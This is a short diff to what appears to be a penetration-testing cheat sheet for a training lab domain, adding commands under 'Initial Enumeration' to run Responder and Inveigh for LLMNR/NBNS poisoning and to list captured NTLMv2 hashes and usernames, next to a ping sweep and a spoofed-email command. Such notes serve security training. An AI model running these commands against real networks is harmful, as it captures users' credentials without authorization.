@@ -1032,6 +1032,18 @@ swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --
 
 #### Initial Enumeration
 ```
+# Responder 
+sudo responder -I ens224 -A
+
+# Inveigh
+Import-Module .\Inveigh.ps1
+(Get-Command Invoke-Inveigh).Parameters
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+OR 
+.\Inveigh.exe
+GET NTLMV2UNIQUE
+GET NTLMV2USERNAMES
+
 # Performs a ping sweep on the specified network segment from a Linux-based host
 fping -asgq 172.16.5.0/23
 
